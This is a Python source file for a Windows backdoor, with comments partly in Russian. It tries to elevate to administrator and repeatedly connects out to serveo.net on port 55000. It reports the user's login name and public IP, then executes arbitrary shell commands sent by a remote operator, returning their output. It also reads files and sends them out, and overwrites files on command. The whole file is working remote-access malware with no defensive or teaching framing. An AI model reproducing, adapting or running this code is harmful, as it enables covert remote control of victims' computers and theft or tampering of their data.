import requests
import subprocess
import socket
import os
import time
import ctypes
import sys


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def run_as_admin():
    try:
        if is_admin():
            return  # Уже запущено с правами администратора

        # Запуск текущего скрипта с правами администратора
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, ' '.join(sys.argv), None, 0)
        except:
            print("Ошибка при попытке запустить с правами администратора")

    except Exception:
        pass


class backdoor:
    def __init__(self, REMOTE_HOST, REMOTE_PORT):
        self.REMOTE_HOST = REMOTE_HOST
        self.REMOTE_PORT = REMOTE_PORT

        count = 0

        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print("[-] Connection Initiating...")
                client.connect((self.REMOTE_HOST, self.REMOTE_PORT))
                print("[-] Connection initiated!")                   #connect accept

                client.send(os.getlogin().encode('utf-8'))
                try:
                    response = requests.get('https://api.ipify.org') #client.recv
                    client.send(response.text.encode('utf-8'))
                except Exception:
                    client.send('error'.encode('utf-8'))

                def read():
                    try:
                        read_file = command[5:].strip()  # Extract the file name from the command
                        with open(read_file, 'r') as file_read:
                            lines = file_read.readlines()
                            client.send(str(len(lines)).encode('utf-8'))  # Send the number of lines to the server

                            for line in lines:
                                client.send(line.encode('utf-8').strip())  # Send the line without extra newlines
                                ack = client.recv(2)  # Wait for acknowledgment from the server
                                if ack != b'OK':  # Break the loop if acknowledgment is not OK
                                    break
                    except FileNotFoundError:
                        print(f"Error: {read_file} not found.")
                    except Exception as e:
                        print(f"An error occurred: {e}")

                def edit():
                    try:
                        # Receive the file name to edit
                        edit_file = client.recv(131072).decode('utf-8')

                        # Receive the number of lines in the file
                        file_length = int(client.recv(131072).decode('utf-8'))

                        # Open the file in write mode
                        with open(edit_file, 'w') as file:
                            for _ in range(file_length):
                                line = client.recv(131072).decode('utf-8')
                                file.write(line)  # Write the line to the file
                                client.send(b'OK')  # Acknowledge after writing each line

                    except Exception as e:
                        client.send(f'Error: {e}'.encode('utf-8'))


                while True:
                    try:
                        try:
                            client.settimeout(10.0)
                            if client.recv(1024).decode() == 'Up': # test connection # client.send('Up')
                                print('Up')
                            else:
                                print('Unexpected syntax')
                                client.close()
                                break

                        except socket.timeout:
                            print('Time Out!')
                            client.close()
                            break
                        except Exception as Err:
                            print(Err)
                            client.close()
                            break

                        client.settimeout(None)                                                  #command = input()
                        command = client.recv(131072).decode('utf-8', errors='replace') #client.send(command)

                        if command.startswith('read'):
                            read()
                            client.send("Successful".encode('utf-8')) #client.recv()
                            continue

                        elif command == 'edit':
                            edit()
                            client.send("Successful".encode('utf-8')) #client.recv()
                            continue

                        elif command == 'reconnect':
                            client.close()
                            time.sleep(5)
                            break

                        elif command == 'exit':
                            client.send("exit".encode('utf-8')) #client.recv()
                            client.close()
                            break

                        else:

                            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                            output = op.stdout.read() + op.stderr.read()
                            if output == b'':
                                client.send('No Output!'.encode()) #client.recv()
                            else:
                                length = len(output)
                                client.send(str(length).encode('utf-8'))  # Send the length as a UTF-8 string
                                client.sendall(output)  # Send all the data

                            #client.send(output)
                            print(output)



                    except Exception as e:
                        print(f"[!] An error occurred: {e}")
                        break




            except ConnectionRefusedError:
                # print("[!] Connection refused. Make sure the server is running.")
                time.sleep(3)
                break


            except Exception as e:
                # print(f"[!] An error occurred: {e}")
                time.sleep(3)
                break



if __name__ == "__main__":
    try:
        try:
            run_as_admin()
        except Exception:
            pass

        while True:
            REMOTE_HOST = 'serveo.net'
            REMOTE_PORT = 55000

            backdoor(REMOTE_HOST, REMOTE_PORT)
    except Exception:
        print("exit")
